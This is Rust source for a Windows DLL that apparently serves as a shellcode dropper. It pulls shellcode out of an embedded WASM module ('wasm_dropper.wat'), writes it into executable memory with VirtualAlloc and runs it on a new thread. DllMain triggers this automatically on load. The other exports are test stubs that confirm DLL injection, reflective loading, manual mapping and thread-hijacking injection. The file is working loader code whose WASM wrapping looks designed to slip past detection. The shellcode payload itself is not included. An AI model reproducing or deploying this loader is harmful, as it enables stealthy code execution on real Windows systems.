use windows::{core::PCWSTR, Win32::{System::{Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}, Threading::{CreateThread, WaitForSingleObject}}, UI::WindowsAndMessaging::{MessageBoxW, MB_OK}}};
use std::fs::OpenOptions;
use std::io::Write;
use std::os::windows::ffi::OsStrExt;
use std::ffi::OsStr;

// ...existing code...
fn log_to_file(msg: &str) {
    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open("C:/temp/dll_log.txt") {
        let _ = writeln!(file, "{}", msg);
    }
}

// WASM shellcode execution function
fn execute_wasm_shellcode() -> Result<(), Box<dyn std::error::Error>> {
    log_to_file("[DLL] Starting WASM shellcode execution");
    
    // Extract shellcode using the same logic as execute_shellcode()
    let engine = wasmtime::Engine::default();
    let mut store = wasmtime::Store::new(&engine, ());

    // Embed the .wat file content to avoid path length issues
    let function = include_str!("wasm_dropper.wat");

    // Create a linker to define required imports
    let mut linker = wasmtime::Linker::new(&engine);

    // Define __wbindgen_placeholder__.__wbindgen_describe
    linker.func_wrap(
        "__wbindgen_placeholder__",
        "__wbindgen_describe",
        |_: i32| {
            // Minimal stub
            Ok(())
        },
    )?;

    // Define __wbindgen_externref_xform__.__wbindgen_externref_table_grow
    linker.func_wrap(
        "__wbindgen_externref_xform__",
        "__wbindgen_externref_table_grow",
        |size: i32| -> wasmtime::Result<i32> {
            // Return size as a placeholder
            Ok(size)
        },
    )?;

    // Define __wbindgen_externref_xform__.__wbindgen_externref_table_set_null
    linker.func_wrap(
        "__wbindgen_externref_xform__",
        "__wbindgen_externref_table_set_null",
        |_: i32| {
            // Minimal stub
            Ok(())
        },
    )?;

    // Compile the module from string
    let module = wasmtime::Module::new(&engine, function)?;
    log_to_file("[hollow] WASM Module instantiated");

    // Instantiate with linker
    let instance = linker.instantiate(&mut store, &module)?;
    log_to_file("[hollow] WASM Instance instantiated");

    // Get exported functions
    let read_func = instance
        .get_func(&mut store, "read_wasm_at_index")
        .expect("`read_wasm_at_index` was not an exported function")
        .typed::<u32, u32>(&store)?;

    let mem_size_func = instance
        .get_func(&mut store, "get_wasm_mem_size")
        .expect("couldn't get mem size")
        .typed::<(), u32>(&store)?;

    let buff_size = mem_size_func.call(&mut store, ())?;
    let mut shellcode_buffer: Vec<u8> = vec![0x00; buff_size as usize];


    // Copy shellcode from WASM to buffer
    for i in 0..buff_size {
        shellcode_buffer[i as usize] = read_func.call(&mut store, i)? as u8;
    }

    // Allocate executable memory
    let alloc_ptr = unsafe {
        VirtualAlloc(
            None,
            buff_size as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if alloc_ptr.is_null() {
        return Err("VirtualAlloc failed".into());
    }

    // Copy shellcode to allocated memory
    unsafe {
        std::ptr::copy_nonoverlapping(shellcode_buffer.as_ptr(), alloc_ptr as *mut u8, buff_size as usize);
    }

    println!("copy_nonoverlapping");

    // Create and run thread to execute shellcode
    let mut thread_id: u32 = 0;
    let thread_handle = unsafe {
        CreateThread(
            None,
            0,
            Some(std::mem::transmute(alloc_ptr)),
            None,
            windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
            Some(&mut thread_id),
        )?
    };

    if thread_handle.0.is_null() {
        return Err("CreateThread failed".into());
    }

    println!("created thread handle: {thread_id}");

    // Wait for thread to complete
    unsafe {
        WaitForSingleObject(thread_handle, 0xFFFFFFFF);
    };

    Ok(())

}

#[unsafe(no_mangle)]
pub extern "system" fn test_wasm_shellcode() -> i32 {
    log_to_file("[DLL] test_wasm_shellcode called");
    if let Err(e) = execute_wasm_shellcode() {
        log_to_file(&e.to_string());
    }
    0
}

#[unsafe(no_mangle)]
pub extern "system" fn test_injection() -> i32 {
    let msg: Vec<u16> = OsStr::new("DLL Injected Successfully!").encode_wide().chain(Some(0)).collect();
    let title: Vec<u16> = OsStr::new("Test DLL").encode_wide().chain(Some(0)).collect();
    log_to_file("[DLL] test_injection called");
    unsafe {
        MessageBoxW(
            None,
            PCWSTR(msg.as_ptr()),
            PCWSTR(title.as_ptr()),
            MB_OK,
        );
    }
    0
}

#[unsafe(no_mangle)]
pub extern "system" fn test_reflective() -> i32 {
    let msg: Vec<u16> = OsStr::new("Reflective DLL Injection Successful!").encode_wide().chain(Some(0)).collect();
    let title: Vec<u16> = OsStr::new("Reflective DLL").encode_wide().chain(Some(0)).collect();
    log_to_file("[DLL] test_reflective called");
    unsafe {
        MessageBoxW(
            None,
            PCWSTR(msg.as_ptr()),
            PCWSTR(title.as_ptr()),
            MB_OK,
        );
    }
    0
}

#[unsafe(no_mangle)]
pub extern "system" fn test_manual_map() -> i32 {
    let msg: Vec<u16> = OsStr::new("Manual Mapping with IAT Fixups Successful!").encode_wide().chain(Some(0)).collect();
    let title: Vec<u16> = OsStr::new("Manual Map DLL").encode_wide().chain(Some(0)).collect();
    log_to_file("[DLL] test_manual_map called");
    unsafe {
        MessageBoxW(
            None,
            PCWSTR(msg.as_ptr()),
            PCWSTR(title.as_ptr()),
            MB_OK,
        );
    }
    0
}

#[unsafe(no_mangle)]
pub extern "system" fn test_thread_hijack() -> i32 {
    let msg: Vec<u16> = OsStr::new("Thread Hijacking Injection Successful!").encode_wide().chain(Some(0)).collect();
    let title: Vec<u16> = OsStr::new("Thread Hijack DLL").encode_wide().chain(Some(0)).collect();
    log_to_file("[DLL] test_thread_hijack called");
    unsafe {
        MessageBoxW(
            None,
            PCWSTR(msg.as_ptr()),
            PCWSTR(title.as_ptr()),
            MB_OK,
        );
    }
    0
}

#[unsafe(no_mangle)]
pub extern "system" fn DllMain(_hinst: *mut (), _reason: u32, _reserved: *mut ()) -> i32 {
    log_to_file("[DLL] DllMain called - executing WASM shellcode");
    if let Err(e) = execute_wasm_shellcode() {
        log_to_file(&e.to_string());
    }
    return 1;
}


#[unsafe(no_mangle)]
pub extern "C" fn init() {
    println!("Plugin initialized!");
}